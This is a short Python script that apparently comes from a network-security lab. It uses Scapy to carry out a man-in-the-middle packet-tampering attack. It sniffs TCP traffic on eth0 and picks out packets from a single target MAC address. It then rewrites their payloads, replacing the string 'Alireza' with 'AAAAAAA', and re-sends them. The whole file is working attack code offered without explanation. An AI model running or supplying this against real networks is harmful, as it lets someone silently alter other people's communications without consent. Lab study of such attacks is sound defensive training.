#!/usr/bin/env python3
from scapy.all import *

print("LAUNCHING MITM ATTACK.........")

TARGET_MAC = "36:2f:74:26:17:cb"

def spoof_pkt(pkt):
    if not pkt.haslayer(Ether):
        return

    if pkt[Ether].src != TARGET_MAC:
        return  # Skip packets not from the target MAC

    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            print("*** %s, length: %d" % (data, len(data)))

            # Replace a pattern
            newdata = data.replace(b'Alireza', b'AAAAAAA')
            send(newpkt/newdata)
        else: 
            send(newpkt)

# Still use a general filter to reduce load (TCP traffic only)
f = 'tcp'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
